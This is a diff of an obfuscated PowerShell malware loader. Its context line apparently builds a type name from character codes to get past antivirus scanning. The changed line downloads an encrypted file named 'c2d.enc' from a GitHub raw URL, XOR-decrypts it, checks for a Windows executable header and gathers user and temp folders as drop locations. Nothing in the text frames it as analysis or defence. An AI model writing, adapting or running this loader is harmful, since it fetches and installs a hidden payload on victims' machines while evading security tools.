@@ -2,7 +2,7 @@ try{$a=[Ref].Assembly.GetType(-join([char[]](83,121,115,116,101,109,46,77,97,110
 try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
 try{
   $k=@(0x0A,0x75,0x73,0xA3)
-  $b=(New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/kai195102/d/main/c2d.enc')
+  $b=(New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/kai195102/d/refs/heads/main/c2d.enc')
   for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i]-bxor$k[$i%4]}
   if($b[0]-ne77-or$b[1]-ne90){exit}
   $p=@();foreach($d in @([Environment]::GetFolderPath('LocalApplicationData'),$env:TEMP,[Environment]::GetFolderPath('CommonApplicationData'))){if(Test-Path $d){$p+=$d}}
